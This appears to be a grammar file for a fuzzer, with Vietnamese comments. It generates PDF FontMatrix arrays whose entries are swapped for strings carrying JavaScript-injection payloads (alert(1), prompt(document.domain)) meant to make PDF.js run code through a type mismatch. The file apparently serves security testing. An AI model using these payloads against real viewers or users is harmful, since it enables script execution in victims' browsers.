# Khởi tạo quy tắc cho mảng FontMatrix với 6 phần tử độc lập
ctx.rule("FONTMATRIX", "/FontMatrix [ {VAL} {VAL} {VAL} {VAL} {VAL} {VAL} ]")

# Định nghĩa {VAL} có thể là Số (chuẩn) hoặc Chuỗi (gây Type Mismatch)
ctx.rule("VAL", "{NUM}")
ctx.rule("VAL", "{MISMATCH_STRING}")

# Định nghĩa các giá trị kiểu Số (Number) hợp lệ
ctx.rule("NUM", "0")
ctx.rule("NUM", "1")
ctx.rule("NUM", "2")
ctx.rule("NUM", "3")
ctx.rule("NUM", "4")
ctx.rule("NUM", "5")
ctx.rule("NUM", ".00048828125")
ctx.rule("NUM", "-.00048828125")

# Định nghĩa giá trị kiểu Chuỗi (String) gây Type Mismatch chứa mã độc JS
# Trong cấu trúc PDF, chuỗi được bao bọc bởi ( )
ctx.rule("MISMATCH_STRING", "({JS_PAYLOAD})")

# Các payload JavaScript độc hại để ép PDF.js thực thi
# Lưu ý: Các dấu ngoặc đóng mở bên trong JS cần được escape bằng \ theo chuẩn PDF
ctx.rule("JS_PAYLOAD", "1\\); alert\\(1\\)")
ctx.rule("JS_PAYLOAD", "0\\); prompt\\(document.domain\\)")
ctx.rule("JS_PAYLOAD", "1\\); alert\\('origin: '+window.origin\\)")
ctx.rule("JS_PAYLOAD", "test_string")